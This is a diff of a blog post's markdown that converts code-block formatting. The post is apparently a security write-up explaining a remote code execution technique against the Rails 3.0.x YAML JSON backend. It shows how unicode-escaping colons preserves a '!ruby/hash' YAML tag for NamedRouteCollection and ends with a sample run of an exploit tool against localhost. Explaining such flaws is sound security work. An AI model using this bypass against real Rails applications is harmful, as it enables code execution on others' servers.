@@ -32,10 +32,8 @@ backends. [JSONGem] uses the [json] gem, [Yajl] uses the high-performance
 before passing it to `YAML.load`. Oddly enough, [Yaml] (and not [JSONGem])
 is the default JSON backend in Rails 3.0.x:
 
-{% highlight ruby %}
-ActiveSupport::JSON.backend
-=> ActiveSupport::JSON::Backends::Yaml
-{% endhighlight %}
+    ActiveSupport::JSON.backend
+    => ActiveSupport::JSON::Backends::Yaml
 
 The problem with the [Yaml] backend is that it's [convert_json_to_yaml] method
 is incredibly naive. The method uses [StringScanner] to walk through the JSON
@@ -47,18 +45,14 @@ However, [convert_json_to_yaml] does replace all `:` characters with `: `,
 in an attempt to convert JSON Hashes into YAML Hashes. This will corrupt
 our YAML tags:
 
-{% highlight ruby %}
-yaml = "--- !ruby/hash:ActionController::Routing::RouteSet::NamedRouteCollection"
-ActiveSupport::JSON::Backends::Yaml.send(:convert_json_to_yaml,yaml)
-# => "--- !ruby/hash: ActionController: : Routing: : RouteSet: : NamedRouteCollection"
-{% endhighlight %}
+    yaml = "--- !ruby/hash:ActionController::Routing::RouteSet::NamedRouteCollection"
+    ActiveSupport::JSON::Backends::Yaml.send(:convert_json_to_yaml,yaml)
+    # => "--- !ruby/hash: ActionController: : Routing: : RouteSet: : NamedRouteCollection"
 
 Luckily, [convert_json_to_yaml] also parses JSON unicode-escaped characters:
 
-{% highlight ruby %}
-ActiveSupport::JSON::Backends::Yaml.send(:convert_json_to_yaml,yaml.gsub(':','\u003a'))
-# => "--- !ruby/hash:ActionController::Routing::RouteSet::NamedRouteCollection"
-{% endhighlight %}
+    ActiveSupport::JSON::Backends::Yaml.send(:convert_json_to_yaml,yaml.gsub(':','\u003a'))
+    # => "--- !ruby/hash:ActionController::Routing::RouteSet::NamedRouteCollection"
 
 Now to get the YAML payload from [rails_rce.rb] executing. The `module_eval`ed
 code in [ActionController::Routing::RouteSet::NamedRouteCollection#define_hash_access][define_hash_access 3.0.x]
@@ -68,9 +62,7 @@ Due to this difference, we simply reused the Rails 2.x payload from the
 
 After some minor modifications to [rails_rce.rb] we had a working exploit:
 
-{% highlight shell %}
-$ rails_omakase http://localhost:3000/secrets "puts 'lol'"
-{% endhighlight %}
+    $ rails_omakase http://localhost:3000/secrets "puts 'lol'"
 
     lol
     
